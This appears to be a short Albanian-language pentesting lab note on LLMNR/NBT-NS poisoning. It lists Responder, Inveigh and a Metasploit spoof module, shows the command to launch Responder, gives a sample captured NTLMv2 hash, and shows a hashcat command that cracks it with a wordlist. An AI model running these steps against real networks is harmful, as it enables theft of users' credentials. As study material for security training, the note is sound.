
### 🧰 _Tools të Përdorshme_

- **Responder** (më i përdoruri në Linux)
- **Inveigh** (kryesisht për Windows/PowerShell)
- **Metasploit** (moduli `auxiliary/spoof/llmnr/`)

### 🚀 _Përdorimi i Responder_

1. Zbulo emrin e interface-it aktiv ([p.sh](http://p.sh). me `ip a` ose `ifconfig`)
2. Nis Responder në interface-in aktiv:

```bash
sudo responder -I ens224
```

### 🔐 **Cracking NTLMv2 Hashes with Hashcat**

Shembull i Hashit NTLMv2 nga Responder

```bash
forend::INLANEFREIGHT:1122334455667788:4A5B6C7D8E9F...:0101000000000000...
```

Përdorimi i Hashcat për të crack-u hashin

```bash
hashcat -m 5600 hash_file.txt /usr/share/wordlists/rockyou.txt
```